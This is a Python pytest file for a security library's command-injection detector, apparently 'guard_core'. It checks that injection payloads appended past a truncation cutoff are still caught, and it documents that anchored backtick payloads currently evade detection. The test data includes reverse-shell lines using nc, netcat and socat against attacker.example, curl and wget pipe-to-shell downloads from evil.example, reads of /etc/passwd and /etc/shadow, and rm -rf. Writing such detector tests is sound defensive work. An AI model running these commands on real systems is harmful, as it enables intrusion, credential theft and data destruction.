import re

import pytest

from guard_core.sync.detection_engine.preprocessor import ContentPreprocessor
from guard_core.sync.handlers.suspatterns_handler import (
    SusPatternsManager,
    _build_regex_threat,
)

_CMD_INJECTION_PATTERNS = [
    re.compile(pattern, re.IGNORECASE | re.MULTILINE)
    for pattern, _contexts, category in SusPatternsManager._pattern_definitions
    if category == "cmd_injection"
]

_MAX_CONTENT_LENGTH = 300
_FILLER = (
    "lorem ipsum dolor sit amet consectetur adipiscing elit sed do "
    "eiusmod tempor incididunt ut labore et dolore magna aliqua "
) * 5

COMMAND_INJECTION_PAYLOADS_PAST_TRUNCATION_CUTOFF = [
    pytest.param("; cat /etc/passwd", id="semicolon_cat_etc_passwd"),
    pytest.param("; ls -la /root", id="semicolon_ls_la_root"),
    pytest.param("| whoami", id="pipe_whoami"),
    pytest.param("|| id", id="double_pipe_id"),
    pytest.param("&& id", id="double_ampersand_id"),
    pytest.param("& id", id="ampersand_id"),
    pytest.param("; id", id="semicolon_id"),
    pytest.param("; cat /etc/shadow", id="semicolon_cat_etc_shadow"),
    pytest.param("| nc -e /bin/sh attacker.example 4444", id="pipe_nc_reverse_shell"),
    pytest.param("; nc -e /bin/sh 10.0.0.1 4444", id="semicolon_nc_reverse_shell"),
    pytest.param(
        "; wget http://evil.example/shell.sh -O /tmp/s.sh",
        id="semicolon_wget_download",
    ),
    pytest.param("; curl http://evil.example/x | sh", id="semicolon_curl_pipe_sh"),
    pytest.param("| curl http://evil.example/x | bash", id="pipe_curl_pipe_bash"),
    pytest.param("; ping -c 1 evil.example", id="semicolon_ping_flag"),
    pytest.param("&& wget http://evil.example/x", id="double_ampersand_wget"),
    pytest.param("|| curl http://evil.example/x", id="double_pipe_curl"),
    pytest.param("; rm -rf /tmp/x", id="semicolon_rm_rf"),
    pytest.param("; uname -a", id="semicolon_uname_a"),
    pytest.param("| uname -a", id="pipe_uname_a"),
    pytest.param("; socat TCP:evil.example:4444 EXEC:/bin/sh", id="semicolon_socat"),
    pytest.param("| socat TCP:evil.example:4444 EXEC:/bin/sh", id="pipe_socat"),
    pytest.param("; sh -c id", id="semicolon_sh_c_id"),
    pytest.param("; bash -c id", id="semicolon_bash_c_id"),
    pytest.param("; ksh -c id", id="semicolon_ksh_c_id"),
    pytest.param("; zsh -c id", id="semicolon_zsh_c_id"),
    pytest.param("; ash -c id", id="semicolon_ash_c_id"),
    pytest.param("; csh -c id", id="semicolon_csh_c_id"),
    pytest.param("; tsch -c id", id="semicolon_tsch_c_id"),
    pytest.param(";cat /etc/passwd", id="semicolon_nospace_cat_etc_passwd"),
    pytest.param("|cat /etc/passwd", id="pipe_nospace_cat_etc_passwd"),
    pytest.param("&cat /etc/passwd", id="ampersand_nospace_cat_etc_passwd"),
    pytest.param(
        "; netcat -e /bin/sh attacker.example 4444",
        id="semicolon_netcat_reverse_shell",
    ),
    pytest.param("|lynx http://evil.example/x", id="pipe_lynx"),
    pytest.param("|links http://evil.example/x", id="pipe_links"),
    pytest.param("|fetch http://evil.example/x", id="pipe_fetch"),
    pytest.param("|lwp-download http://evil.example/x", id="pipe_lwp_download"),
    pytest.param("; ls -la; whoami", id="semicolon_chained_ls_whoami"),
    pytest.param("$(nc -e /bin/sh 10.0.0.1 4444)", id="dollar_paren_nc_reverse_shell"),
    pytest.param("; python -c $(echo x)", id="semicolon_python_dollar_paren"),
    pytest.param(
        "; wget -q http://evil.example/shell -O- | sh",
        id="semicolon_wget_pipe_sh",
    ),
]


def _is_cmd_injection_detected(text: str) -> bool:
    for pattern in _CMD_INJECTION_PATTERNS:
        match = pattern.search(text)
        if match and _build_regex_threat(pattern, match, "cmd_injection", 0.0):
            return True
    return False


BACKTICK_ANCHORING_EXCLUSION_REASON = (
    "the cmd_injection backtick pattern in suspatterns_handler.py is "
    "\\A...\\Z anchored: it only matches when the entire scanned string is "
    "the backtick command, so any leading filler defeats it regardless of "
    "preprocessor behavior. This is a suspatterns_handler.py anchoring "
    "property, not a preprocessor truncation defect. It would start "
    "detecting these once that anchoring is relaxed to search()-style "
    "matching."
)

BACKTICK_PAYLOADS_EXCLUDED_BY_CURRENT_ANCHORING = [
    pytest.param("`whoami`", id="backtick_whoami"),
    pytest.param("`id`", id="backtick_id"),
    pytest.param("`cat /etc/passwd`", id="backtick_cat_etc_passwd"),
    pytest.param("`reboot`", id="backtick_reboot"),
    pytest.param("`uname -a`", id="backtick_uname_a"),
    pytest.param("`hostname`", id="backtick_hostname"),
    pytest.param("`pwd`", id="backtick_pwd"),
    pytest.param("`groups`", id="backtick_groups"),
    pytest.param("`ifconfig`", id="backtick_ifconfig"),
    pytest.param("`env`", id="backtick_env"),
    pytest.param("`sudo -l`", id="backtick_sudo_l"),
    pytest.param("`crontab -l`", id="backtick_crontab_l"),
]


@pytest.fixture
def preprocessor() -> ContentPreprocessor:
    return ContentPreprocessor(
        max_content_length=_MAX_CONTENT_LENGTH, preserve_attack_patterns=True
    )


@pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS_PAST_TRUNCATION_CUTOFF)
def test_command_injection_payload_past_cutoff_survives_truncation(
    preprocessor: ContentPreprocessor, payload: str
) -> None:
    content = _FILLER + payload
    assert len(content) > _MAX_CONTENT_LENGTH

    truncated = preprocessor.truncate_safely(content)

    assert truncated == content
    assert _is_cmd_injection_detected(truncated)


@pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS_PAST_TRUNCATION_CUTOFF)
def test_command_injection_payload_past_cutoff_survives_full_preprocessing(
    preprocessor: ContentPreprocessor, payload: str
) -> None:
    content = _FILLER + payload
    assert len(content) > _MAX_CONTENT_LENGTH

    result = preprocessor.preprocess(content)

    assert _is_cmd_injection_detected(result)


@pytest.mark.parametrize("payload", BACKTICK_PAYLOADS_EXCLUDED_BY_CURRENT_ANCHORING)
def test_backtick_payload_standalone_is_detected(payload: str) -> None:
    assert _is_cmd_injection_detected(payload)


@pytest.mark.parametrize("payload", BACKTICK_PAYLOADS_EXCLUDED_BY_CURRENT_ANCHORING)
def test_backtick_payload_past_cutoff_text_survives_truncation(
    preprocessor: ContentPreprocessor, payload: str
) -> None:
    content = _FILLER + payload
    assert len(content) > _MAX_CONTENT_LENGTH

    truncated = preprocessor.truncate_safely(content)

    assert truncated == content
    assert payload in truncated


@pytest.mark.parametrize("payload", BACKTICK_PAYLOADS_EXCLUDED_BY_CURRENT_ANCHORING)
def test_backtick_payload_past_cutoff_excluded_by_current_anchoring(
    preprocessor: ContentPreprocessor, payload: str
) -> None:
    content = _FILLER + payload
    truncated = preprocessor.truncate_safely(content)

    assert not _is_cmd_injection_detected(truncated), (
        BACKTICK_ANCHORING_EXCLUSION_REASON
    )
